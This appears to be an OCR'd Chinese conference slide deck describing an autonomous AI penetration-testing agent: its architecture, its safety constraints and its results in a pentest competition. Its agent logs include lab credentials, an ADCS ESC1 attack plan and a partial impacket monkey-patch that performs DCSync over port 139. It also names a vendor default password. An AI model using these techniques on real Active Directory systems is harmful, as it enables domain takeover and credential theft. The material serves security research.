# Self-Evolving Kill Chain: Agent自适应进化与实战

演讲人：水滴实验室-杨太原、卓越

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/83769da580f100b051b827c16b38f53af1800324c1cc6b5738618625d909a50f.jpg)


# 天翼安全-水滴实验室

深耕前沿安全技术攻关与产业化落地应用，充分依托运营商优质网络资源与雄厚信息技术能力，持续开展智能攻防对抗、高危漏洞挖掘、自研安全工具创新、恶意威胁监测与攻击溯源等核心研究工作，斩获一系列高水平研究成果。相关研究多次入选 Black Hat、HITB、DEFCON 等国际顶级安全峰会，技术成果获得行业高度认可。

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/f13d448396011b357e6e1e7c5f18e2cf3e2ae790dca940891c32805334a15170.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/6e9c602384ebf8f53a29089974ef7e763f690c27d9ad9fde085f119ca1620466.jpg)


# 水滴实验室

# WATERDROP LABORATORY

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/b18f93fe8444b256ac8b4ad689bbfe8c929e4d3bfd74866fd6faab43d74a38ae.jpg)


# УВОТАВОВАЛ КОЧДКРЕТАМ

# 至望无溺水

# 目录

PART 01 研究背景

PART 02 系统设计与实现

PART 03 实战表现

PART 04 思考与展望

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/2c2df7233cdc6f12c2b46fe6b3d7b9c230140a9980916297c5f7e790dbc3679b.jpg)


# PART 01

# 研究背景

# AI

# 传统扫描器与AI Agent的能力边界

# 传统扫描器

基于规则/签名模式匹配

# 差异VS互补

核心原理对比

AI Agent 

基于LLM推理决策

已知漏洞批量检测、合规扫描

擅长场景
差异

多步攻击链推理、未知场景探索、自适应绕过

停留在单点漏洞验证（PoC级）

决策能力
区别

根据环境反馈动态调整策略

基于规则/签名模式匹配

攻击深度
不同

可覆盖全链路渗透[Web→提权→横向→域控)

“广度覆盖”

“深度突破”

两者关系并非替代关系，而是相辅相成，形成完整的安全评估闭环

# 大模型 带来的可能性和挑战

# 01

# 自然语言理解

Agent能理解漏洞描述、CVE报告、错误回显等非结构化信息。

# 02

# 多步推理能力

面对复杂攻击链：如Web突破 $\rightarrow$ 容器逃逸 $\rightarrow$ 域渗透），LLM能规划多阶段策略。

# 03

# 自适应能力

当常规路径被封锁时，LLM能基于环境反馈调整战术（如端口封锁时自动寻找替代协议）。

# 04

# 面临的关键挑战

在工具调用可靠性、上下文管理、成本控制、知识时效性及安全边界等方面均存在明显不足。

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/44ac8454ec46e1dd4a4f8260abe469ecd54496ceaa66e15e0aaf287eda6e3402.jpg)


# PART 02

# 系统设计与实现

# AI

# 云啸智能渗透测试系统架构

# L6 智能决策层

任务拆解与规划

子 Agent 委托

多模型配置, 节省成本

经验自蒸馏

分层上下文管理

多#agent模式灵活配置

# L5 Agent 中间件层

工具管线

长文本输出自动截断

对话历史自动摘要

文件系统操作

能力管线

工具按需动态发现

渗透路径实时规划

Skill 渗透技能加载

工具调用容错处理

可观测性

Langfuse Trace 

Tool Call链路追踪

Token/时延/成本统计

# L4 安全工具层

侦察扫描

智能端口扫描

Headless爬虫

指纹识别[1w5+]

子域名采集

漏洞检测

1w+ POC插件

1000+ EXP 

指纹-插件智能匹配

敏感信息泄露检测

后渗透控制

Webshell 管理

隧道代理管理

反弹 Shell 管理

C2管理 [C++, Go, Rust]

通用能力

HTTP 请求

Web Search 

Python/Bash 执行

SKILL/MCP 

# L3 知识与情报层

外部情报源

运营商骨干网流量

全国工商企业数据

PDNS 数据源

测绘引擎

内部知识库

RAG 向量知识库

漏洞知识库映射

红队漏洞库

专用武器库

经验系统

自蒸馏引擎

任务记忆持久化

上下文压缩与恢复

# L2 分布式调度与数据层

控制面 API Server

REST API [Gin] 

Queue 优先级消费

RBAC权限控制

JWT认证鉴权

通信协议

GRPC 

Redis Streams 

执行面Engine $\times$ 几

多引擎水平扩展

插件热加载

12种Worker类型

多引擎数据存储

PostgreSQL 

Elasticsearch 

Redis 

对象存储 [OSS/MinIO]

# L1基础设施层

沙盒安全执行环境

任务级沙盒隔离

文件系统隔离

网络隔离策略

命令白名单+资源限额

云原生弹性部署

容器化扫描节点

Serverless 弹性伸缩

多区域部署

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/baff95364c68a14ff17c95690f0f9dc32a1d125eb1ff3240670f06b8909ef34c.jpg)


# AI Agent 渗透测试运行架构与执行流程

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/ed31e315b6e1d39cf19670e996d56899a03f7d13584bfe527a7137688a1b1329.jpg)


DeepAgent模式介绍及其优势: 采用主从 Agent 架构，由主 Agent 统筹调度并完整留存上下文、子 Agent 专注子任务。

# 01 问题分析

业界主流的Supervisor和PER架构经过测试，在渗透测试场景中表现不佳，存在上下文割裂、信息丢失等问题。

# 02 设计方案

主Agent+多个子Agent，让主Agent拥有内置规划/执行/反思/记忆四重能力。子Aent负责子任务执行，不占用上下文

# 03 上下文优势

主Agent全程持有完整上下文，避免了上下文割裂和信息丢失问题。

# 04 自适应优势

实时感知环境反馈，即时调整策略，无需等待replan。

# 05 关键决策

Explorer前置侦察使用纯确定性管道，不消耗LLM token，可节省2~5分钟。

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/2a7b44ff69077ea7a23d4d76b6cb166568805152126a03d6319859ffa7f3cb48.jpg)


# 8 层中间件管线 · Agent 执行架构创新

# 如何保证Agent稳定完成耗时长且复杂的渗透测试任务?

# 构建8层中间件管线，系统化处理工具调用和长上下文，确保Agent稳定高效执行

1 

Langfuse 观测

2 

上下文
摘要

3 

工具结果降噪

4 

畸形调
用修复

5 

工具
检索

6 

任务规划

7 

技能系统

8 

容错处理

为 Agent 提供全链路可观测、追踪与分析能力，实现运行过程监控、问题溯源与效果评估。

对超长对话上下文进行自动摘要，保留原始指令，解决上下文溢出问题。

将过大的工具输出（如扫描结果）
自动存入文件并生成引用链接，
减少上下文噪音。

修补LLM返回的畸形工具调用，兼容不同模型的输出差异。

仅暴露8个核心工具，其余工具按需语义搜索加载，减少LLM选择幻觉。

提供结构化的任务管理能力，支持复杂任务的规划与追踪。

根据攻击场景动态加载16个渗透技能，为Agent注入专业知识。

捕获Agent执行期间出现的所有错误并进行异常处理，使Agent能根据错误信息调整策略，避免管线中断

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/3e76f246a521c1c78d20518a07d387b95014493fabbbe2390d842670e0d13567.jpg)


# 四重知识体系·LLM 自我进化创新

如何能让Agent自我进化？

# 四重知识体系

# 解决LLM知识时效性问题，实现自我进化

# Skill 技能系统

每个Skill涵盖特定攻击场景（如AD域渗透、权限维持），都是最佳实践，Agent从武器库中自动调用最佳工具。

# RAG 向量知识库

将漏洞库、CVE 描述等通过 Embedding 向量化，Agent 在执行中可实时检索最新知识。

# MEMORY

Memory 作为任务专属记忆中枢，解决长攻击链进度丢失与上下文冗余痛点，保障攻击流程高效连续。

# 经验自蒸馏

Agent在攻击成功后，能自动提炼经验（漏洞类型、Payload等）并写入知识库，形成自我进化的正向循环。

# 自研渗透测试工具·Agent攻防能力创新

如何提高Agent的攻击效率与准确性？

自研工具

— Agent能力的核心基础设施

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/9f15c201317ba605e0a9e762f61ca62a745cb48aecd644026b9b522ea19942ab.jpg)


有效弥补开源工具无法被

程序化调用的短板

1 

Webshell 管理器

基于Go实现的Webshell管理工具，对目标进行全生命周期管理。

支持 Agent 程序化管理多个被控端

C2 

管理器

2 

3 

代理隧道工具

Go 实现的 SOCKS5 代理，支持 Agent 自主搭建多层隧道链路

实现15,000+指纹到5,000+高危漏洞插件的精准关联，达成“识别即检测”的高效模式

指纹一插件映射

4 

5 

More Tools [40+] 

Fingerprint/PDNS/PortScan/Cralwer/Dirscan/Browser... 

# 我们从四个维度构建约束体系

01- 执行边界

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/d11975aeec197dc94930c45359873a4a9293d7deea973fc861a5bd6a58f369c1.jpg)


工作区隔离

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/4b0fc62a22cc36306c3846aa1c0ddabc4aecfe2fc2697c46ada219a4f024861e.jpg)


沙盒隔离

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/6102d70fabcbab13f41037a022903cc400d5b54088c1937d3c7d1abf7f014e06.jpg)


目录挂载

04- 行为边界

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/eb9409972d912c60d9b3ce171a88b07f5b2b24aa47572bed5aa0ff092ffd84cb.jpg)


1. 全链路日志审计：记录生成的脚本、上传的文件路径等。

2. 高危操作人工审批

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/80f27671d3fb3c5db6a2626204cf5610b9a215974c184c2d246b696fec4d71ca.jpg)


02- 目标边界

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/3ea27f6fd16d09561a7d0ee763ac77b65b42470c2211fef3fe43298d010f33e7.jpg)


支持设置白名单范围，

通过中间件和网关

进行限制

03- 认知边界

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/ecc084f57bacf716f3362f739ca23577c736e8fc7a2a3f42d30fee8ad1b78062.jpg)


1. 系统提示固化：核心指令与用户内容严格隔离，工具返回以tool角色消息呈现，避免system注入

2. 分层防御：提示词层-工具层-网关层

# 任务配置

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/4751a37541c3c16974cd79948d3e1160460d3d0d9719625b257d04b99ff33b8c.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/4b8de8985cced536316434fb836da8110acf2c2e596596b0e645f5dc5677e610.jpg)


# Memory记录

# 报告生成

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/2571cfaec1d163914f53af4720d3a3e79dbed48fb0a55e1db233641e6843ff02.jpg)


<table><tr><td>Overview</td><td colspan="4">Plan Memory Tool Calls LLM Screenshot Network 8 Terminal Report</td></tr><tr><td>METHOD</td><td>RESOURCE PATH</td><td>TYPE</td><td>STATUS / TIME</td><td>SIZE</td></tr><tr><td>GET</td><td>http://localhost:20000/</td><td>unknown</td><td>200
-ns</td><td>-</td></tr><tr><td>GET</td><td>https://e.topthink.com/Public/static/client.js</td><td>unknown</td><td>200
-ns</td><td>-</td></tr><tr><td>GET</td><td>http://e.topthink.com/api/basic/ad_bd568ce7058a1091?callback=call.</td><td>unknown</td><td>301
-ns</td><td>-</td></tr><tr><td>GET</td><td>https://e.topthink.com/api/basic/ad_bd568ce7058a1091?callback=cal.</td><td>unknown</td><td>200
-ns</td><td>-</td></tr><tr><td>POST</td><td>http://localhost:20000/index.php7s=captcha</td><td>text/html; charset=UTF-8</td><td>200
18.8ns</td><td>7.2KB</td></tr><tr><td>POST</td><td>http://localhost:20000/index.php7s=captcha</td><td>text/html; charset=UTF-8</td><td>200
18.1ns</td><td>8.2KB</td></tr><tr><td>POST</td><td>http://localhost:20000/index.php7s=captcha</td><td>text/html; charset=UTF-8</td><td>200
36.8ns</td><td>7.9KB</td></tr><tr><td>POST</td><td>http://localhost:20000/index.php7s=captcha</td><td>text/html; charset=UTF-8</td><td>200
7.7ns</td><td>7.2KB</td></tr></table>

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/3478a361f3c0d20e16a99f774cd5dbb7c20f5d758bc6b42118a8eb7e1ee5c869.jpg)


# PART 03

# 实战表现

# AI

# 线上赛成绩

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/40226aff1957f3f10fea78ec8f31a3bd7b2e8161440df89e2dfac4e0f42474d5.jpg)


# 关键成果展示

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/f730da17ad293368753fde1a7f588c0b28311c5545f69a1449b73ecfd00b4ede.jpg)


高覆盖·高速度·强突破·高度自主化

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/c5bcec90e70e257c2943a0e14e13d7211220887619e9064b5c5d42c862399458.jpg)



排名


# 第二

总得分

14795 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/d372f1689100ed4bd2ef7fa5a40f76c199940aef1ab7deedcc46999f77c299c8.jpg)



覆盖率


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/3b074f527e35b6cd0e16fa880b4435186680c721690eac46541562fb37915354.jpg)


成功完成51道题覆盖全部赛区的多类型题目

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/328fc19900d73fbc4357cf0697121b4c72e6c5aa720b7b1a887f930df4e52c4c.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/1b1c6ca870ec9401cce635e2a51930bda0facef9b03b03d454f4a7ebe917ace6.jpg)



速度


Day 1 完成

47题

全场最快

在第一天完成大量题目快速建立领先优势

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/f7e3e0a8aa113e50b306d7715d8e6c592693c4e021d4cf8ecbe7156437133006.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/ceb32e14c5c59854aa8008c616f58e121bc445f02bcda6dd4825275f5a1d1e8e.jpg)



关键突破


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/469116e07df40edc027b4a83432b16c034998c86ab4898170bdde61c1d1c246f.jpg)


最先解锁全部赛区

率先打开全部赛区大门

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/412ffc55cabd92f91f9918b808c9692ba8f088ca32068ba6ee153dcf45c838cf.jpg)


最先通关第四赛区

复杂域渗透环境

在复杂渗透环境中率先突破展现强大的综合攻坚能力

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/559037304e6851bf7fbe790211ac5b8a57681edaf8bc0af8ae13d3797757cbe6.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/9b99a4786f75dd93459274757e569248a1f4f9c455678e73cee939169b5d4338.jpg)



一次性通关率


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/0c6834d27831a82e22065912bc7a923bde83bb4c2fe3879005bbbcc3030af88a.jpg)


一次性自主完成50道题无需人工干预，一次成功体现高度自主化能力

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/bdf57b0c2fa7d4e92a67134118ff3a1861f9f7b3ffe1d98b57fab52f384d1737.jpg)



Day 1 完成题目数对比


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/4b8121fbaecc4ce8485eaf8d791a732662b8291a309673b7c9f142e3edf3198c.jpg)



关键里程碑（时间轴）


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/bafda99d90b6b77991f57dfdb5814d14de351254d029e9ecafa1524b6dc64d71.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/7ea140efedc405383ec6c5026f2674075da9ca0aa802d91759bc02f23b48cd94.jpg)


关键节点领先，持续扩大优势

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/150e46135cfa991225dcab8e4033d05f33d8da5beddbf752740869bd16ff4da9.jpg)


我们在覆盖范围、推进速度、关键突破和自主化能力等方面均表现突出，充分验证了系统在复杂渗透场景中的有效性与实战价值。

# 首个解出压轴题的队伍 自主发现并执行“非预期攻击路径”

第二届智能渗透挑战赛

铸刃止戈 以智御危

在端口受限的复杂环境中，Agent 不依赖预设剧本，通过持续观察、分析与策略重规划，自主突破关键限制，完成域控接管与全链路渗透，率先拿下所有Flag。


高光决策点 ①：受限环境下的策略重规划


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/c1881df8f2c74ef40b1c6a7930b40715c80f3e9395049507169abd1f258a4fbe.jpg)



攻击失败


(Observation) 

尝试ADCS/DCSync失败，445/135端口均被封禁

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/b78b39320d87074f21041e11ade9391e95e137ab2b443a5590996f01cc3e363f.jpg)



原因分析


(Analysis) 

识别RPC依赖端口不可达，常规路径被阻断

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/e08d62cd77af6cfc35dca208b007e3e2a79ebb9ee6b49152c0e7bbd9ceed29a6.jpg)



策略重规划


(Planning) 

询问专家Agent，选择Monkey-Patch + 139端口绕过方案

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/30bd9b25bb5a3717df81df44709bbeb5e4e9ac34ffb4abb62961223e6550447b.jpg)



执行方案


(Execution) 

修改工具行为，强制SMB走139端口，完成攻击闭环

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/38431f55fe3c47ed273edb63431c04a073267b017242c25b3c4d84e111134f23.jpg)



成功突破


(Success) 

成功获取域管证书与HASH，拿下域控权限


高光决策点 ②：突破预期攻击路径（非预期解法）


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/91e33d68cb6a709e480789547a67610e1285df3edbe539d940f57e6e000238d6.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/6ca4c335975a68194379861e196a4fb77b22e78f5bafa9263c96c9a7eaa2b42f.jpg)



压轴题突破的关键设计


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/bd499b833e9bbce3e94098d2e5da7c3ddbc8f96569bfb664d6d9a37d83a1df34.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/c1441bfb8e1da4a7e3ba6e041d0b84d4503b7795d6aa86ed4f94c83929d7698e.jpg)


从 “单路径尝试” → “多路径探索 + 动态协同”，实现复杂环境下的自主收敛与突破

# Agent执行日志

# 专家Agent

04/13 15:27:15 

Neither smbexec nor atexec work (access denied). svc_backup is Backup Operators, not local admin. 

Let me try a key insight: Backup Operators can use SeBackupPrivilege to read any file, including the NTDS.dit. 

But this requires a local login on the DC or special tools. 

Let me try yet another approach - use port 593 (RPC over HTTP) which is open on DC1. I can write a custom script: 

expert_analysis 04/13 15:27:15 

^ 

Input: 

【上下文】

Open ports on DC1: 53(DNS), 88(Kerberos), 139(NetBIOS), 389(LDAP), 464(kpasswd), 593(RPC-HTTP), 636(LDAP) 

Certipy version: 5.0.4 

My credential: svc_backup / Bk@Serv2024!QwE (Backup Operators group) 

Template: ShadowWorkstation (ESC1, EnrolleeSuppliesSubject=True) 

CA: shadow-DC01-CA on DC1.shadow.local 

certipy req -h shows options: -web, -dcom, -dynamic-endpoint 

It also has LDAP options like -ldap-scheme, -ldap-port 

【问题】

I'm doing an ADCS ESC1 attack against a Windows 2019 DC (DC1.shadow.local at 192.168.20.8). The CA is 

The problem is: 

- DC1 ports 445, 135, 3389, 5985 are FIREWALLED (blocked) 

- DC1 ports that ARE open: 53, 88, 139, 389, 464, 593, 636, 3268, 3269, 9389 

I have certify v5.0.4 installed. Standard certify req fails because it needs SMB (445) or endpoint map 

Port 593 (RPC over HTTP proxy) IS open. Can I use this for certificate enrollment? How? 

Also, port 139 (NetBIOS) is open - could this be used for SMB via NetBIOS session service? 

What are my options to request an ADCS certificate when port 445 is blocked but ports 88, 139, 389, 59 

# Agent执行Monkey Patch

04/13 16:20:37 

Multiple ports support DRSUAPI: 49668, 49689, 49691. Now I can monkey-patch secretsdump to use one of these ports directly instead of querying EPM: 

bash_exec 04/13 16:20:37 

^ 

Input: 

cat << 'PYSCRIPT' | ssh -o StrictHostKeyChecking=no root@10.255.0.15 'cat > /tmp/dcsync_direct#!/usr/bin/env python3 

" " " "DCSync via direct DRSUAPI port - bypasses EPM and port 445" " " " 

import sys, os 

# Monkey-patch 1: SMBConnection port 445 -> 139 

import impacket.smbconnection 

original_smb_init = impacket.smbconnection.SMBConnection.__init__ 

def patched_smb_init(self, remoteName="", remoteHost="", myName=None, sess_port=445, timeout: 

if sess_port == 445 and remoteHost == '192.168.20.8': 

sess_port = 139 

remoteName = 'DC1' 

return original_smb_init(self, remoteName, remoteHost, myName, sess_port, timeout, prefe 

impacket.smbconnection.SMBConnection.__init__ = patched_smb_init 

# Monkey-patch 2: Skip EPM lookup, use direct DRSUAPI port 49668 

from impacket.dcerpc.v5 import epm, drsuapi, transport as dcetransport 

original_hept_map = epm.hept_map 

def patched_hept_map(destHost, *args, **kwargs): 

# If looking for DRSUAPI on DC1, return direct binding 

if destHost == '192.168.20.8': 

binding = f'ncacn_ip_tcp:192.168.20.8[49668]' 

print(f' [PATCH] EPM bypassed -> {binding}') 

return binding 

return original_hept_map(destHost, *args, **kwargs) 

epm.hept_map = patched_hept_map 

# Run secretsdump 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/073eab38ad11a958ae09c88e8f1dcbc670b4717a7f5c598597a05ca6000c887a.jpg)


# PART 04

# 思考与展望

# AI

# 发生了什么？

- 第三赛区最后 2 个 flag，卡了整整 4 天

- 赛后真相：SSH 密码为weaver@2023〔泛微默认口令〕

- Agent 尝试密码: weaver@2024

# 为什么是这个密码？

- 来源：知识库直接检索命中该条记录

- 知识库中无“weaver@年份”抽象规则

- Agent 失败后零泛化：未尝试任何年份变体

# 事实 与回溯

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/9992ff0711d7cbf115105543009f16453b9b7a24636baabeeb791cd01c3be1df.jpg)


# 分析与反思

# 它做对了什么？

- 识别“泛微OA”关键词

- 检索到相关密码条目

# 它差在哪里？

- 不理解“2024”是可变年份变量

- 失败后行为终止，无后续推理

# 核心认知

- 字面值 weaver@2024 → 只会照抄

- 模式 weaver@年份 → 才可能枚举

- 把“模式直觉”变成 Agent 可泛化的知识，是知识工程的核心挑战

![image](https://cdn-mineru.openxlab.org.cn/result/2026-05-29/3fd12f20-d628-4136-a6cb-73ec8ca1b6a5/9582d2413d49bbfa873be86202a229757b0e740463413eb76ed2517f15636c70.jpg)


Agent 的上限，就是知识工程的边界而我们的任务，就是不断推高这个边界

# THANKS

# AI